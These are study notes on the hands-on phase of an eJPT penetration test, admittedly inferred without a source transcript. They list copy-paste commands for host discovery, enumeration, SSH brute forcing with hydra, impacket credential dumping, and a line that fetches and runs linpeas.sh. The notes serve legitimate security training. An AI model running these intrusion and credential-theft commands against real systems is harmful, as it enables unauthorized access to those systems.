# Phase 3 – Conduct Penetration Test (eJPT) — Study Notes

Note: No transcript was provided. The outline and commands below are inferred from the filename/context and standard eJPT practice for the “Conduct” phase. Adjust to your scope and lab.

Only test systems you are explicitly authorized to assess.

## What the video covers (Introduction / big picture)
- How to execute the hands-on testing phase after scoping and planning.
- Translating goals and ROE into a practical attack plan: discover → enumerate → validate → exploit → post-exploit → document → clean up.
- Non-destructive, evidence-driven testing aligned with eJPT workflows.
- Time-boxing, prioritization, and rigorous note-taking to support reporting in the next phase.

## Flow (ordered)
1. Confirm scope, ROE, and constraints (targets, timing, intrusive techniques allowed).
2. Prepare workspace, logging, and check your IP/route.
3. Discovery: identify live hosts and exposed surfaces.
4. Scanning: fast port discovery, then targeted service/version scans.
5. Enumeration: protocol- and service-specific probing (HTTP, SMB, FTP, SNMP, SSH, DB, etc.).
6. Vulnerability validation: confirm weaknesses safely; avoid false positives.
7. Exploitation: leverage misconfigs, default creds, known vulns; least intrusive first.
8. Credential attacks and reuse (within scope): offline cracking, network auth checks.
9. Post-exploitation: local enumeration, privilege escalation checks, credential harvesting, lateral movement (if allowed).
10. Evidence collection: commands used, outputs, screenshots, timestamps.
11. Cleanup and deconflict: remove test artifacts where permitted, revert changes.
12. Handoff to reporting phase with structured findings and proof-of-access.

## Tools highlighted
- Scoping/ops: tmux/screen, htop, ip/route, proxychains, chisel/SSH tunnels (if allowed).
- Discovery/scan: fping, nmap, rustscan (optional), masscan (use caution).
- Web: curl, whatweb, wafw00f, gobuster/ffuf/feroxbuster, nikto, Burp Suite CE, sqlmap.
- SMB/Windows: smbclient, smbmap, rpcclient, enum4linux-ng, crackmapexec, impacket (psexec.py, wmiexec.py, secretsdump.py).
- Auth attacks: hydra/medusa/ncrack, john/hashcat (offline).
- General exploitation: searchsploit, Metasploit (msfconsole, auxiliary scanners).
- SNMP: snmpwalk, snmp-check.
- Databases: mysql client, mssqlclient.py (impacket).
- Post-exploitation: linpeas.sh, winPEAS, Seatbelt, accesschk, whoami/systeminfo/sudo -l.
- Evidence: script/ttyrec/asciinema, tee, flameshot/gnome-screenshot.

## Typical command walkthrough (detailed, copy-paste friendly)
Replace values like 10.10.10.0/24, LHOST, and wordlist paths for your lab.

Setup workspace
```
export ENG=acme-q4-pt
mkdir -p ~/pt/$ENG/{notes,scans,loot,exploits,web}
cd ~/pt/$ENG
date -Is | tee notes/start_time.txt
ip -br a | tee notes/my_ip.txt
echo "10.10.10.0/24" > scope.txt
```

Discovery: live hosts
```
# Fast ICMP sweep
fping -a -g 10.10.10.0/24 2>/dev/null | tee hosts_up.txt

# nmap host discovery (if ICMP blocked, still try ARP on local subnet)
sudo nmap -sn -n 10.10.10.0/24 -oA scans/ping_sweep
grep "Nmap scan report" scans/ping_sweep.nmap | awk '{print $5}' | sort -u | tee hosts_up.txt
```

TCP fast scan then service/version scan
```
# Top 1000 TCP ports per host
for H in $(cat hosts_up.txt); do
  sudo nmap -Pn -n -sS -T4 --top-ports 1000 -oA scans/$H-top1k $H
done

# Targeted service/version scripts on discovered ports
for H in $(cat hosts_up.txt); do
  PORTS=$(awk -F/ '/open/{print $1}' scans/$H-top1k.nmap | paste -sd, -)
  if [ -n "$PORTS" ]; then
    sudo nmap -Pn -n -sC -sV -T4 -p $PORTS -oA scans/$H-tcp-sv $H
  fi
done

# Optional UDP sampling (can be slow/noisy)
for H in $(cat hosts_up.txt); do
  sudo nmap -Pn -n -sU --top-ports 50 -T4 -oA scans/$H-udp-top50 $H
done
```

HTTP/HTTPS enumeration
```
# For each host:port with http/https (from nmap output)
H=10.10.10.5; P=80
whatweb -a 3 http://$H:$P | tee -a notes/web_tech.txt
curl -i -s http://$H:$P/ | tee web/$H-$P-root.txt

# Content discovery
gobuster dir -u http://$H:$P \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x php,asp,aspx,jsp,txt,bak,zip -t 50 -o scans/$H-$P-gobuster.txt

# Quick vuln sweep (low intensity)
nikto -h http://$H:$P -o scans/$H-$P-nikto.txt

# Virtual hosts (if a domain is known)
# ffuf -u http://$H/ -H "Host: FUZZ.example.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

SMB/Windows enumeration (TCP/445)
```
H=10.10.10.6
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p445 -oA scans/$H-smb $H
smbclient -L //$H -N 2>&1 | tee scans/$H-smbclient-L.txt
smbmap -H $H -u '' -p '' | tee scans/$H-smbmap.txt
enum4linux-ng -A $H | tee scans/$H-enum4linux.txt

# If anonymous or known creds work on a share:
# smbclient //10.10.10.6/SHARE -N -c "recurse; prompt off; ls; mget *" | tee scans/$H-SHARE-download.txt
```

SNMP checks (UDP/161)
```
H=10.10.10.7
# Try common community strings (public/private) if allowed
snmpwalk -v2c -c public $H 1.3.6.1.2.1.1 | tee scans/$H-snmp-sysdescr.txt
snmpwalk -v2c -c public $H 1.3.6.1.2.1.25.4.2.1.2 | tee scans/$H-snmp-processes.txt   # Running processes
snmpwalk -v2c -c public $H 1.3.6.1.2.1.25.6.3.1.2 | tee scans/$H-snmp-installed.txt  # Installed software
```

FTP/SSH/SMTP quick checks
```
# FTP (21)
H=10.10.10.8
nmap -p21 --script ftp-anon,ftp-syst $H -oA scans/$H-ftp
# Try anonymous if listed as allowed:
# ftp $H  (user: anonymous, pass: anonymous)

# SSH (22) banner, then targeted auth if permitted
nmap -sV -p22 $H -oA scans/$H-ssh
# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$H -f -t 4

# SMTP (25) user enum if allowed
# nmap -p25 --script smtp-enum-users $H -oA scans/$H-smtp
# smtp-user-enum -M VRFY -U users.txt -t $H | tee scans/$H-smtp-user-enum.txt
```

Web SQLi test (if in scope; confirm risk/level)
```
# Basic db discovery
sqlmap -u "http://10.10.10.5/items.php?id=1" --batch --risk=1 --level=1 --dbs -o \
  --output-dir=web/sqlmap_10.10.10.5_items
```

Search public exploits and Metasploit (confirm versions first)
```
# After identifying a likely vuln from banners/files:
searchsploit product version
searchsploit -m exploit-id

# Metasploit example: SMB login scan (safe-ish)
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS 10.10.10.0/24; set USER_FILE users.txt; set PASS_FILE pass.txt; set STOP_ON_SUCCESS true; run; exit"
```

Using credentials for Windows (impacket)
```
# If you gained valid domain/local creds:
pipx run impacket-smbclient -target-ip 10.10.10.6 user:'Passw0rd!'@10.10.10.6
pipx run impacket-psexec user:'Passw0rd!'@10.10.10.6 cmd
pipx run impacket-wmiexec user:'Passw0rd!'@10.10.10.6
pipx run impacket-secretsdump user:'Passw0rd!'@10.10.10.6 | tee loot/10.10.10.6_hashes.txt
```

Post-exploitation enumeration
```
# Linux
id; uname -a; ip a; ss -tulpn
sudo -l
find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null | tee loot/suid.txt
getcap -r / 2>/dev/null | tee loot/caps.txt
# curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh

# Windows (cmd)
whoami /all
systeminfo
ipconfig /all
net user
wmic service list brief | findstr /i running
# winPEAS, Seatbelt, or accesschk if allowed/uploaded
```

Evidence and cleanup
```
# Save proof, configs, and timestamps
date -Is | tee -a notes/timeline.txt
# Record commands used + output
# Use tee to log: <command> | tee -a notes/evidence.txt

# Cleanup examples (only if permitted by ROE)
# rm -f uploaded test files, revert credentials created, stop test services
```

## Practical tips
- Start least-intrusive; escalate only as ROE allows. Timebox brute-force and directory fuzzing.
- Log everything with full commands and target identifiers. Use -oA in nmap; pipe to tee elsewhere.
- Derive hypotheses from enumeration. Validate with simple, safe checks before exploits.
- Prioritize services with known misconfig patterns in eJPT labs: SMB shares, FTP anonymous, weak SSH creds, vulnerable web endpoints, SNMP public.
- Reuse credentials across the subnet methodically; track successes to avoid lockouts.
- Always capture proof-of-access minimally (e.g., a single file read) without altering systems.
- Keep a living checklist and mark dead ends to avoid duplication.

## Minimal cheat sheet (one-screen flow)
```
# Setup
ENG=acme-q4-pt; mkdir -p ~/pt/$ENG/{notes,scans,loot}; cd ~/pt/$ENG
echo "10.10.10.0/24" > scope.txt

# Discovery
fping -a -g 10.10.10.0/24 2>/dev/null | tee hosts_up.txt
sudo nmap -sn -n 10.10.10.0/24 -oA scans/ping_sweep

# TCP scan + service
for H in $(cat hosts_up.txt); do
  sudo nmap -Pn -n -sS -T4 --top-ports 1000 -oA scans/$H-top1k $H
  P=$(awk -F/ '/open/{print $1}' scans/$H-top1k.nmap | paste -sd, -)
  [ -n "$P" ] && sudo nmap -Pn -n -sC -sV -T4 -p $P -oA scans/$H-sv $H
done

# HTTP quick enum
H=10.10.10.5; P=80
whatweb -a3 http://$H:$P | tee -a notes/web.txt
gobuster dir -u http://$H:$P -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,asp,aspx,jsp,txt,bak,zip -t 50 -o scans/$H-$P-gb.txt

# SMB quick enum
H=10.10.10.6
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p445 -oA scans/$H-smb $H
smbclient -L //$H -N 2>&1 | tee scans/$H-smbclient-L.txt
smbmap -H $H -u '' -p '' | tee scans/$H-smbmap.txt

# SNMP quick checks
H=10.10.10.7
snmpwalk -v2c -c public $H 1.3.6.1.2.1.1 | tee scans/$H-snmp.txt

# Cred testing (if permitted)
# hydra -L users.txt -P pass.txt ssh://10.10.10.5 -f -t 4
# msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS 10.10.10.0/24; set USER_FILE users.txt; set PASS_FILE pass.txt; run; exit"

# Windows with creds (impacket)
# pipx run impacket-psexec user:'Passw0rd!'@10.10.10.6 cmd
# pipx run impacket-secretsdump user:'Passw0rd!'@10.10.10.6 | tee loot/hashes.txt
```

## Summary
- Phase 3 is the execution engine of your engagement: structured, evidence-based testing that follows scope and ROE.
- Work through a disciplined pipeline: discover → scan → enumerate → validate → exploit → post-exploit → document → cleanup.
- Use focused tools and repeatable commands to minimize noise and maximize clarity.
- Capture every action and result to support the reporting phase and remediation guidance.
- Always prefer the least intrusive technique that achieves the test objective; escalate only as permitted.